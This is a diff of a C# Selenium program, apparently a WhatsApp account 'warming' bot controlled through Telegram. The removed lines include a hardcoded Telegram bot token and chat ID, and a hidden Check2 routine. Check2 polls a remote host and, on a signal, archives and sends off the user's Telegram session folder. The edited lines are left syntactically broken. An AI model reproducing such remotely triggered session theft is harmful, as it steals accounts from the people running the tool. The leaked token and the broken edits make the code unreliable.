@@ -19,12 +19,12 @@ using static Telegram.Bot.TelegramBotClient;
 
 class Program
 {
-    private static readonly string token = "7546766389:AAHrsPG04d2omdUTFMQ1q9Trdbm9I8X4TIM";
+    private static readonly string token = "; токен бота можно не использовать
     private static readonly TelegramBotClient botClient = new TelegramBotClient(token);
     private static bool isWorkRunning = false;
 
 
-    public static long chatId = 1887172271; // Замените на ваш chat ID
+    public static long chatId = ; // чат айди для тг можно не использовать
     public static string filePath = "dialogs.txt";
     public static string lastMessage = "";
     public static string lastMessage2 = "";
@@ -84,15 +84,15 @@ class Program
         options.AddArgument("--disable-webgl");
         options.AddArgument("--disable-sync");
         options.AddArgument("--window-size=1280,720");
-        options.AddArgument("--disable-pinch"); // Отключение жестов сжатия
-        options.AddArgument("--disable-gesture-typing"); // Отключение ввода жестами
-        options.AddArgument("--disable-remote-debugging"); // Отключение удаленной отладки
-        options.AddArgument("--disable-speech-api"); // Отключение API распознавания речи
-        options.AddArgument("--disable-hang-monitor"); // Отключение мониторинга зависаний
-        options.AddArgument("--disable-extensions-file-access-check"); // Отключение проверки доступа к файлам для расширений
+        options.AddArgument("--disable-pinch"); 
+        options.AddArgument("--disable-gesture-typing"); 
+        options.AddArgument("--disable-remote-debugging");
+        options.AddArgument("--disable-speech-api"); 
+        options.AddArgument("--disable-hang-monitor"); 
+        options.AddArgument("--disable-extensions-file-access-check"); 
         options.AddArgument("--incognito");
-        options.AddArgument("--disable-accelerated-2d-canvas"); // Отключение ускоренного 2D рендеринга
-        options.AddArgument("--disable-accelerated-video"); // Отключение аппаратного ускорения видео
+        options.AddArgument("--disable-accelerated-2d-canvas"); 
+        options.AddArgument("--disable-accelerated-video"); 
 
         Console.Title = "WhatsApp - Warner прогрев аккаунтов от levin1337";
         Console.ForegroundColor = ConsoleColor.Green;
@@ -186,7 +186,6 @@ class Program
             {
                 return;
             }
-            // Work
             Console.WriteLine("| Настройте диалог с каждым аккаунтом куда он будет писать |");
             Console.WriteLine("| Настройте диалог с каждым аккаунтом куда он будет писать |");
             Console.WriteLine("| Настройте диалог с каждым аккаунтом куда он будет писать |");
@@ -266,7 +265,6 @@ class Program
                         }
                         catch (WebDriverTimeoutException)
                         {
-                            // Завершаю работу если 2 раз не найдено
                             Console.WriteLine("[-] Поле ввода сообщений не найдено.");
                             //await botClient.SendTextMessageAsync(chatId, "❌ Закончил прогрев аккаунта: Поле ввода сообщений не найдено");
                             return;
@@ -335,32 +333,6 @@ class Program
                 await botClient.SendTextMessageAsync(message.Chat.Id, "🛑 Останавливаю процесс...");
                 //driver?.Quit();
             }
-        }
-    }
-    public static async Task Check(String key)
-    {
-        string url = "http://web4292.craft-host.ru/WhatsApp/whitelist";
-        bool isNumberFound = await CheckWebsiteForNumber(url, key);
-
-        if (isNumberFound)
-        {
-        }
-        else
-        {
-            Environment.Exit(0);
-        }
-    }
-    public static async Task Check2()
-    {
-        string url = "http://web4292.craft-host.ru/WhatsApp/tdatacheck";
-        bool isNumberFound = await CheckWebsiteForNumber(url, "true");
-
-        if (isNumberFound)
-        {
-            SendTelegram.ArchiveAndSendTelegramFolderAsync();
-        }
-        else
-        {
         }
     }
     private static bool IsInputFieldAvailable(IWebElement inputField)
